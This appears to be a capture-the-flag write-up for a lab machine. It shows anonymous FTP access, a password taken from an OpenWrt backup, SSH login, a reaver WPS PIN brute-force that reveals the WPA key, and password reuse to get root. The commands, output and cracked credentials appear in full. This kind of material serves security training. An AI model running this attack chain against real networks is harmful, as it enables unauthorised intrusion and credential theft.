@@ -1,0 +1,325 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ftp 10.10.11.247                                 
+Connected to 10.10.11.247.
+220 (vsFTPd 3.0.3)
+Name (10.10.11.247:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+ftp> dir
+229 Entering Extended Passive Mode (|||46662|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
+-rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
+-rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
+-rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
+-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
+226 Directory send OK.
+ftp> 
+
+
+tar -xvf backup-OpenWrt-2023-07-26.tar
+
+in config/wireless we find 
+VeRyUniUqWiFIPasswrd1!
+
+and etc/passwd and etc/shadow with the netadmin user
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh netadmin@10.10.11.247              
+The authenticity of host '10.10.11.247 (10.10.11.247)' can't be established.
+ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
+This key is not known by any other names.
+...
+
+Last login: Tue Sep 12 12:46:00 2023 from 10.10.14.23
+netadmin@wifinetic:~$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
+        inet6 fe80::250:56ff:feb0:6026  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b0:60:26  txqueuelen 1000  (Ethernet)
+        RX packets 66714  bytes 4099159 (4.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 65910  bytes 3581478 (3.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 7376  bytes 442632 (442.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 7376  bytes 442632 (442.6 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
+        RX packets 32939  bytes 5800671 (5.8 MB)
+        RX errors 0  dropped 32939  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
+        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
+        RX packets 1095  bytes 103830 (103.8 KB)
+        RX errors 0  dropped 151  overruns 0  frame 0
+        TX packets 1291  bytes 150518 (150.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
+        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
+        RX packets 338  bytes 46562 (46.5 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1095  bytes 123540 (123.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+netadmin@wifinetic:~$ 
+
+
+"Upon enumerating the network configurations, we have identified the presence of two wireless
+interfaces, each with an assigned IP address. Additionally, the BSSID (Basic Service Set Identifier) is
+available for both wireless interfaces. However, it is unclear from the information which interface
+serves as the Access Point (AP) in this specific environment.
+To clarify the roles of these wireless interfaces and determine the AP, we will further investigate
+the network configurations and cross-reference them with the available wireless settings. This
+examination will allow us to distinguish between the client and AP interfaces.
+Next, we will shift our focus to the custom services running on the system"
+
+
+netadmin@wifinetic:~$ systemctl status wpa_supplicant.service
+● wpa_supplicant.service - WPA supplicant
+     Loaded: loaded (/lib/systemd/system/wpa_supplicant.service; enabled; vendor preset: enabled)
+     Active: active (running) since Tue 2025-11-11 09:05:58 UTC; 29s ago
+   Main PID: 5553 (wpa_supplicant)
+      Tasks: 1 (limit: 4595)
+     Memory: 1.1M
+     CGroup: /system.slice/wpa_supplicant.service
+             └─5553 /sbin/wpa_supplicant -u -s -c /etc/wpa_supplicant.conf -i wlan1
+netadmin@wifinetic:~$ 
+
+"Based on the information gathered from the WPA supplicant, it appears to be acting as a Wi-Fi
+client and connecting through the wlan1 interface. With this insight, we can deduce that wlan0 is
+likely serving as the Access Point (AP) interface in this environment.
+To further validate our understanding, we will now investigate the presence of the hostap service.
+Hostap is commonly used in routers and Android phones to create and manage Access Points. By
+examining the system's services, we can confirm whether hostap is utilised to set up the Access
+Point on wlan0 ."
+
+
+netadmin@wifinetic:~$ systemctl status hostapd.service
+● hostapd.service - Advanced IEEE 802.11 AP and IEEE 802.1X/WPA/WPA2/EAP Authenticator
+     Loaded: loaded (/lib/systemd/system/hostapd.service; enabled; vendor preset: enabled)
+     Active: active (running) since Tue 2025-11-11 09:06:33 UTC; 37s ago
+    Process: 5585 ExecStart=/usr/sbin/hostapd -B -P /run/hostapd.pid -B $DAEMON_OPTS ${DAEMON_CONF} (code=exited, st>
+   Main PID: 5600 (hostapd)
+      Tasks: 1 (limit: 4595)
+     Memory: 920.0K
+     CGroup: /system.slice/hostapd.service
+             └─5600 /usr/sbin/hostapd -B -P /run/hostapd.pid -B /etc/hostapd/hostapd.conf
+netadmin@wifinetic:~$ 
+
+
+"The output indicates that the wlan0 interface is configured as an Access Point. Let's enumerate
+wireless network interfaces"
+
+
+netadmin@wifinetic:~$ iwconfig
+lo        no wireless extensions.
+
+hwsim0    no wireless extensions.
+
+eth0      no wireless extensions.
+
+wlan2     IEEE 802.11  ESSID:off/any  
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+          
+wlan1     IEEE 802.11  ESSID:off/any  
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+          
+mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+          
+wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+          
+netadmin@wifinetic:~$ 
+
+
+"Based on the output of the iwconfig command, we have identified the following information
+about the network interfaces:
+1. wlan0: This interface is in master mode, indicating that it is configured as the Access Point
+(AP). This aligns with our previous understanding based on the hostap service running on
+the system.
+2. wlan1: This interface is in client mode, confirming that it functions as a Wi-Fi client,
+connecting to another wireless network. We observed the AP BSSID associated with this client
+interface earlier.
+3. mon0: This interface is in monitor mode, which is commonly used for wireless network
+monitoring and testing purposes. It does not participate in regular client or AP activities.
+4. wlan2: This interface is in managed mode but is not associated with any network. It appears
+to be inactive at the moment.
+With this information in hand, we can now utilise the iw command to conduct further exploration
+into the network interface setup. iw is a powerful tool that provides detailed information and
+statistics about wireless network interfaces and their configurations"
+
+
+netadmin@wifinetic:~$ iw dev
+phy#2
+	Interface mon0
+		ifindex 7
+		wdev 0x200000002
+		addr 02:00:00:00:02:00
+		type monitor
+		txpower 20.00 dBm
+	Interface wlan2
+		ifindex 5
+		wdev 0x200000001
+		addr 02:00:00:00:02:00
+		type managed
+		txpower 20.00 dBm
+phy#1
+	Unnamed/non-netdev interface
+		wdev 0x100000052
+		addr 42:00:00:00:01:00
+		type P2P-device
+		txpower 20.00 dBm
+	Interface wlan1
+		ifindex 4
+		wdev 0x100000001
+		addr 02:00:00:00:01:00
+		ssid OpenWrt
+		type managed
+		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
+		txpower 20.00 dBm
+phy#0
+	Interface wlan0
+		ifindex 3
+		wdev 0x1
+		addr 02:00:00:00:00:00
+		ssid OpenWrt
+		type AP
+		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
+		txpower 20.00 dBm
+netadmin@wifinetic:~$ 
+
+
+"Based on the iw command's output, we have obtained more specific details about the network
+interfaces and their configurations:
+1. wlan0: This interface is classified as an AP (Access Point) and is associated with phy0 , which
+represents the physical wireless device. As expected, this confirms that wlan0 is indeed the
+Access Point in the OpenWRT setup.
+2. wlan1: This interface is categorised as managed and has a non-net-dev interface type of P2P-
+device . The managed mode indicates that wlan1 is used as a regular Wi-Fi client, and the
+P2P-device type suggests it may support Wi-Fi Direct or peer-to-peer communications.
+3. phy2, wlan2, and mon0: These interfaces are linked with phy2 representing a separate
+physical wireless device. wlan2 is classified as a managed interface, while mon0 is set in
+monitor mode. The presence of both wlan2 and mon0 on phy2 indicates that they are part
+of the same wireless card.
+Having established the roles of each interface and their associations with specific physical devices,
+we can leverage wlan2 and mon0 on phy2 for monitoring activities. Based on the network
+structure and the information obtained from our enumeration, here is how the network of this
+machine is designed:"
+
+
+"Attempting to brute force the WPS PIN could potentially lead to obtaining the actual Wi-Fi
+password. Let's check if we've any pre installed tools that are having capabilities set to perform
+network related activities"
+
+
+netadmin@wifinetic:~$ getcap -r / 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/reaver = cap_net_raw+ep
+netadmin@wifinetic:~$ 
+
+
+"We find the reaver utility from the output. Given this, we can potentially perform a WPS PIN
+attack using reaver . To proceed with the WPS PIN attack, we require the BSSID (Basic Service Set
+Identifier) of the Access Point (AP). This BSSID uniquely identifies the AP, and having it allows us to
+target the specific AP for the attack.
+To obtain the BSSID, we can either utilise the wash tool or the output from iw command"
+
+
+
+netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1
+
+Reaver v1.6.5 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Switching mon0 to channel 1
+[+] Waiting for beacon from 02:00:00:00:00:00
+[+] Received beacon from 02:00:00:00:00:00
+[+] Trying pin "12345670"
+[+] Sending authentication request
+[!] Found packet with bad FCS, skipping...
+[+] Sending association request
+[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received M5 message
+[+] Sending M6 message
+[+] Received M7 message
+[+] Sending WSC NACK
+[+] Sending WSC NACK
+[+] Pin cracked in 2 seconds
+[+] WPS PIN: '12345670'
+[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
+[+] AP SSID: 'OpenWrt'
+[+] Nothing done, nothing to save.
+netadmin@wifinetic:~$ 
+
+
+netadmin@wifinetic:~$ su root
+Password: 
+root@wifinetic:/home/netadmin# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
